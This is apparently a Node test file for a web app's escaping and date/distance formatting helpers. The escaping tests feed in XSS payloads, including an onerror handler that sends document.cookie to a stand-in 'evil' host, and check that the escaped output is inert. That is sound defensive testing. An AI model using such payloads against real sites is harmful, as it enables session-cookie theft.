// Escaping and formatting. Local only, no framework:  node tests/dom.test.mjs
//
// esc() is the XSS boundary for the whole app: everything renders through innerHTML
// templates, and `note` and cat `name` arrive from a public, login-free endpoint.
import assert from 'node:assert';
import { dateText, distanceText, esc, whenText } from '../frontend/app/dom.js';

let pass = 0;
const check = (name, fn) => {
  try { fn(); pass++; }
  catch (e) { console.error(`FAIL  ${name}\n      ${e.message}`); process.exitCode = 1; }
};

check('esc neutralises every HTML-significant character', () => {
  assert.strictEqual(esc('<script>alert(1)</script>'),
    '&lt;script&gt;alert(1)&lt;/script&gt;');
  assert.strictEqual(esc(`" onerror='x'`), '&quot; onerror=&#39;x&#39;');
  assert.strictEqual(esc('a & b'), 'a &amp; b');
});

check('esc escapes the ampersand first, so entities are not double-decoded', () => {
  // Getting the order wrong turns &lt; into &amp;lt; or, worse, lets &amp;#39; through
  // as a live quote.
  assert.strictEqual(esc('&lt;'), '&amp;lt;');
});

check('esc renders null and undefined as empty, not as the words', () => {
  assert.strictEqual(esc(null), '');
  assert.strictEqual(esc(undefined), '');
  assert.strictEqual(esc(0), '0', 'zero is a real value');
});

check('a realistic attack in a note is inert', () => {
  const note = `<img src=x onerror="fetch('//evil/'+document.cookie)">`;
  const out = esc(note);
  assert.ok(!out.includes('<'), 'no raw angle brackets survive');
  assert.ok(!out.includes('"'), 'no raw quotes survive');
});

const NOW = Date.UTC(2026, 8, 10, 12, 0, 0);
const DAY = 86_400_000;

check('whenText reads like a person', () => {
  assert.strictEqual(whenText(NOW, NOW), 'today');
  assert.strictEqual(whenText(NOW - DAY, NOW), 'yesterday');
  assert.strictEqual(whenText(NOW - 5 * DAY, NOW), '5 days ago');
  assert.strictEqual(whenText(NOW - 30 * DAY, NOW), 'last month');
  assert.strictEqual(whenText(NOW - 400 * DAY, NOW), 'a year ago');
});

check('whenText handles a future timestamp without saying "-1 days ago"', () => {
  assert.strictEqual(whenText(NOW + DAY, NOW), 'just now');
});

check('whenText on bad input is empty, not NaN', () => {
  assert.strictEqual(whenText(null), '');
  assert.strictEqual(whenText(undefined), '');
  assert.strictEqual(whenText(NaN), '');
});

check('distanceText uses units a walker would use', () => {
  assert.strictEqual(distanceText(3), 'right here');
  assert.strictEqual(distanceText(40), '40 metres away');
  assert.strictEqual(distanceText(1500), '1.5 km away');
  assert.strictEqual(distanceText(NaN), '');
});

check('dateText produces a readable absolute date', () => {
  // Rendered in the VIEWER's zone by design, so this asserts shape rather than an exact
  // hour — pinning the hour would make the suite fail in a different timezone.
  const s = dateText(Date.UTC(2026, 7, 14, 18, 42));
  assert.match(s, /^\d{1,2} \w+, \d{1,2}:\d{2}(am|pm)$/, `got "${s}"`);
  assert.ok(!s.includes('.'), 'the day period must be "pm", not "p.m."');
  assert.strictEqual(dateText(null), '');
});

console.log(`dom: ${pass} checks passed`);
